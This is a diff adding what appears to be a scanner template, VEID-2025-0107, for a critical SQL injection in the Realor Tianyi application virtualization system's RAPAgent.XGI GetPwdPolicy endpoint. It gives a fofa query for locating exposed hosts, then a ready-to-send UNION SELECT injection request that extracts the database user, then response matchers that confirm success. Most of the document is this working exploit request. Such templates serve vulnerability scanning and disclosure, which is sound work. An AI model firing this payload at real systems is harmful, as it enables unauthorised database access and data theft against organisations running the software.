@@ -1,0 +1,25 @@
+## id: VEID-2025-0107
+## name: 瑞友天翼应用虚拟化系统GetPwdPolicy存在SQL注入漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,sql,veid2025
+## description: 瑞友天翼应用虚拟化系统GetPwdPolicy存在SQL注入漏洞
+## fofa-query: app="REALOR-天翼应用虚拟化系统"
+## verification: true
+
+
+GET /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+user()%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "html"
+#@ matcher: body contains "[result]" && body contains "result="
+
+
+
+
+
+# @VEIL-STAMP: bcaaddb6ff8e6cb2fd7854944687d34816940788374036910e2c274f9bcb6e8a
